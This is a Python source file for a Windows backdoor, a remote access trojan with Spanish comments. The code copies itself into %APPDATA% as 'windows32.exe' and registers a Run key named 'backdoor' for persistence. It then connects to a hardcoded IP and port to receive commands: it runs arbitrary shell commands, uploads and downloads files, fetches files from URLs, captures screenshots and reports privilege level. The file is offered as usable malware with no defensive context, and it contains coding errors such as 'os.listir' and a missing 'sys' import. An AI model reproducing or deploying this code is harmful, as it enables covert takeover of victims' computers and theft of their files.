#!/usr/bin/env python
#_*_ coding: utf8 _*_

import socket
import os
import subprocess
import base64
import mss
import requests
import time
import shutil

def admin_check():
	global admin
	try:
		check =  os.listir(os.sep.join([os.environ.get("SystemRoot","C:\windows"),"temp"]))
	except:
		admin = "privilegios insuficientes"
	else:
		admin = "privilegios de adminitrador "

def create_persistence():
	location = os.environ["appdata"] + "\\windows32.exe"
	if not os.path.exists(location):
		shutil.copyfile(sys.executable,location)
		subprocess.call("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor/t REG_SZ/d '" + location + "'",shell=True)

def connection():
	while True:
		time.sleep(5)
		try:
			#poner ip del servidor y el mismo puerto del servidor
			cliente.connect(("192.168.100.43",7777))
			#######################################
			shell()
		except:
			connection()

def captura_pantalla():
	screen = mss.mss()
	screen.shot()

def web_download(url):
	consulta = requests.get(url)
	name_file = url.split("/")[-1]
	with open (name_file,"wb") as file_get:
		file_get.write(consulta.content)


def shell():
	current_dir = os.getcwd()
	cliente.send(current_dir)

	while True:
		res = cliente.recv(1024)
		if res == "exit":
			break

		elif res[:2] == "cd" and len(res) > 2 :
			os.chdir(res[3:])
			result = os.getcwd()
			cliente.send(result)

		elif res[:8] == "download":
			with open(res[9:],"rb") as file_download:
				cliente.send(base64.b64encode(file_download.read()))

		elif res[:6] == "upload":
			with open(res[7:],"wb") as file_upload:
				datos = cliente.recv(30000)
				file_upload.write(base64.b64decode(datos))

		elif res[:3] == "get":
			try:
				web_download(res[4:])
				cliente.send("Archivo descargado correctamente")
			except :
				cliente.send("Ha ocurrido un error en la descarga") 


		elif res[:10] == "screenshot":
				try:
					captura_pantalla()
					with open("monitor-1.png","rb") as file_send:
						cliente.send(base64.b64encode(file_send.read()))
					os.remove("monitor-1.png")
				except:
					cliente.send(base64.b64encode("fail"))

		elif res[:5] == "start":
			try:
				subprocess.Popen(res[6:], shell = True)
				cliente.send("Se a anicido con exito el programa")
			except :
				cliente.send("No se puedo iniciar el program correctamente")

		elif res[:5] == "check":
			try:
				cliente.send(admin)
			except :
				cliente.send("no se puedo realixar la tarea")

		else:
			proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			
			if len(result) == 0:
				cliente.send("1")
			else:
			 cliente.send(result)
create_persistence()
cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
cliente.close()
